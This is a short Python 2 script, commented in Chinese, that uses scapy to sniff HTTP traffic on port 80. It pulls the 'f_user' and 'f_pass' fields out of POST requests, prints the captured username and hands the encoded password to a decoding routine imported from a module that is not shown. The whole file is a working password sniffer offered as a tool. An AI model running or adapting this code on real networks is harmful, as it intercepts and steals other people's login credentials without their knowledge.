#-*- coding:utf8 -*-

from scapy.all import *
from passdecode import *

# 定义数据包回调函数
def packet_callback(packet):
    str = packet.sprintf("{IP:%IP.src% -> %IP.dst%\n}{Raw:%Raw.load%\n}")
    #print str
    if "POST" in str:
        n = str.find("f_user")
        if n <> -1:
            #print "wwc1"
            strnew = str[n:]
            m=strnew.find("&f")
            if m <> -1:
                #print "wwc2"
                strnewnew=str[n+7:n+m]            
                print "user is "+strnewnew
        n1=str.find("f_pass")
        if n1 <> -1:
            #print "wwc3"
            strnew = str[n1:]
            #print strnew
            m1=strnew.find("&f")
            if m1 <> -1:
                #print "wwc4"            
                strnewnew1=str[n1+21:n1+m1]            
                #print "password encrypt is "+strnewnew1
                CqDecode(strnewnew1)

# 开启嗅探器
def sniffer_password1(pkcount):
    packets = sniff(filter="tcp and (port 80)", prn=packet_callback, count=pkcount)
    #wrpcap("easy.pcap",packets)

if __name__ == '__main__':
    sniffer_password1(1000)
